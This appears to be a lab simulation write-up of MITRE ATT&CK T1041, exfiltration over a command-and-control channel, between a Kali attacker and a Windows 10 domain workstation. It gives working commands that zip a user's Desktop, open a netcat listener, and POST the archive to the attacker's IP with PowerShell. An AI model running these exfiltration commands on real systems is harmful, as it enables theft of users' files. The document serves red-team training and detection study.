# T1041 - Exfiltration Over C2 Channel

## Description
This technique involves transferring collected data from the compromised host back to the attacker-controlled infrastructure over an existing Command and Control (C2) channel or a custom channel.

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Access Level:** Administrator (via Impacket PsExec)
- **Objective:** Collect and exfiltrate data from the target machine

---

## Execution Steps

### 1. On admin reverse shell (Data Collection)

cmd
powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop -DestinationPath C:\Windows\Temp\data.zip"


### 2. On Attacker (Kali) - Set up Listener

bash

nc -lvnp 4444 > data.zip

### 3.On admin reverse shell (Exfiltration)

cmd

powershell -c "Invoke-WebRequest -Uri http://192.168.10.250:4444 -Method Post -InFile C:\Windows\Temp\data.zip"

ResultsStatus: Successful
Successfully created a compressed archive of target user data.
Established a simple file transfer channel using Netcat (nc) on port 4444.
Data was exfiltrated from the target to the attacker machine.

Tools & Techniques Used:
PowerShell Compress-Archive for data staging
Netcat (nc) for receiving exfiltrated data
PowerShell Invoke-WebRequest for outbound transfer





